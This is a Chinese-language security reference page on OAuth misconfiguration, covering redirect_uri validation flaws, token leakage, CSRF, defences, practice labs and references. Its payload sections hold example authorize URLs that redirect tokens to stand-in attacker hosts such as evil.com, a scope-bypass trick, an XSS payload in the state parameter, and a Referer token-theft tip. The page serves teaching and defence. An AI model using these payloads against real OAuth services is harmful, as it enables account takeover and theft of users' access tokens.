# OAuth 配置错误 (OAuth Misconfiguration)

> OAuth 是一个广泛使用的授权框架，允许第三方应用无需暴露用户凭证即可访问用户数据。然而，OAuth 的错误配置和实现可能导致严重的安全漏洞。本文档探讨了常见的 OAuth 配置错误、潜在的攻击向量以及降低这些风险的最佳实践。

## OAuth 配置错误原理

OAuth 是一个开放标准授权框架，它允许用户授权第三方应用访问其存储在另一个服务提供者上的信息，而无需将用户名和密码提供给第三方应用。

### 漏洞成因

1. **重定向URI验证不足**：
   - 未正确验证`redirect_uri`参数
   - 允许开放重定向
   - 接受不安全的URI方案（如`javascript:`）

2. **令牌管理不当**：
   - 授权码被多次使用
   - 访问令牌泄露
   - 刷新令牌未正确保护

3. **CSRF防护缺失**：
   - 未实现`state`参数
   - `state`参数可预测或可绕过
   - 未验证`state`参数

4. **客户端凭据泄露**：
   - 客户端密钥硬编码在客户端代码中
   - 私钥存储在可公开访问的位置
   - 未正确保护客户端凭据

### 攻击面

- **令牌窃取**：通过`referer`头或网络嗅探获取访问令牌
- **账户劫持**：通过开放重定向或XSS攻击劫持OAuth流程
- **跨站请求伪造(CSRF)**：利用未受保护的OAuth回调
- **权限提升**：滥用OAuth范围(scope)获取过高权限
- **信息泄露**：通过错误配置的API端点获取敏感信息

### 影响

- 用户账户被完全控制
- 敏感数据泄露
- 未授权操作执行
- 违反合规要求
- 品牌声誉受损

## 目录

- [通过referer窃取OAuth令牌](#通过referer窃取oauth令牌)
- [通过redirect_uri获取OAuth令牌](#通过redirect_uri获取oauth令牌)
- [通过redirect_uri执行XSS](#通过redirect_uri执行xss)
- [OAuth私钥泄露](#oauth私钥泄露)
- [授权码规则违反](#授权码规则违反)
- [跨站请求伪造(CSRF)](#跨站请求伪造csrf)
- [防御措施](#防御措施)
- [实验环境](#实验环境)
- [参考资料](#参考资料)

## 通过referer窃取OAuth令牌

> 如果你有HTML注入但无法实现XSS怎么办？网站上是否有OAuth实现？如果有，可以设置一个指向你服务器的img标签，看看是否有办法让受害者登录后重定向到该标签，从而通过referer头窃取OAuth令牌 - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)

## 通过redirect_uri获取OAuth令牌

重定向到攻击者控制的域名以获取访问令牌：

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

重定向到可接受的开放URL以获取访问令牌：

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth实现绝不应白名单整个域名，而应只允许特定的URL，以防止`redirect_uri`被指向开放重定向。

有时需要通过更改scope为无效值来绕过对redirect_uri的过滤：

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

## 通过redirect_uri执行XSS

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## OAuth私钥泄露

某些Android/iOS应用可以被反编译，从而泄露OAuth私钥。

## 授权码规则违反

> 客户端不得多次使用授权码。

如果授权码被多次使用，授权服务器必须拒绝该请求，并应撤销（在可能的情况下）之前基于该授权码颁发的所有令牌。

## 跨站请求伪造(CSRF)

未在OAuth回调中检查有效CSRF令牌的应用程序容易受到攻击。这可以通过初始化OAuth流程并拦截回调(`https://example.com/callback?code=AUTHORIZATION_CODE`)来利用。此URL可用于CSRF攻击。

> 客户端必须为其重定向URI实现CSRF保护。这通常通过要求发送到重定向URI端点的任何请求都包含一个将请求绑定到用户代理认证状态的值来实现。客户端在发出授权请求时应使用"state"请求参数将此值传递给授权服务器。

## 防御措施

1. **安全配置**：
   - 严格验证`redirect_uri`参数
   - 使用完整的URL匹配而非域名匹配
   - 禁用不安全的URI方案

2. **令牌管理**：
   - 确保授权码只能使用一次
   - 实施短期访问令牌
   - 安全存储和传输刷新令牌

3. **CSRF防护**：
   - 始终使用`state`参数
   - 确保`state`参数不可预测
   - 验证`state`参数的有效性

4. **客户端安全**：
   - 不要将客户端密钥硬编码在客户端代码中
   - 使用PKCE (Proof Key for Code Exchange)
   - 实施适当的CSP策略

5. **监控与日志**：
   - 记录所有OAuth相关活动
   - 监控异常行为
   - 实施速率限制和异常检测

## 实验环境

- [PortSwigger - 通过OAuth隐式流绕过认证](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
- [PortSwigger - 强制OAuth配置文件链接](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
- [PortSwigger - 通过redirect_uri劫持OAuth账户](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
- [PortSwigger - 通过代理页面窃取OAuth访问令牌](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
- [PortSwigger - 通过开放重定向窃取OAuth访问令牌](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

## 参考资料

- [所有Paypal OAuth令牌都属于我 - asanso - 2016年11月28日](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html)
- [OAuth 2 - 我如何再次入侵Facebook（...并窃取有效访问令牌） - asanso - 2014年4月8日](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
- [我如何再次入侵Github - Egor Homakov - 2014年2月7日](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
- [微软如何将您的数据交给Facebook...以及其他所有人 - Andris Atteka - 2014年9月16日](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)
- [绕过Periscope管理面板的Google认证 - Jack Whitton - 2015年7月20日](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)
- [OAuth 2.0安全最佳实践 - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/OAuth_2.0_Security_Cheat_Sheet.html)
- [OAuth 2.0威胁模型和安全考虑 - IETF RFC 6819](https://tools.ietf.org/html/rfc6819)
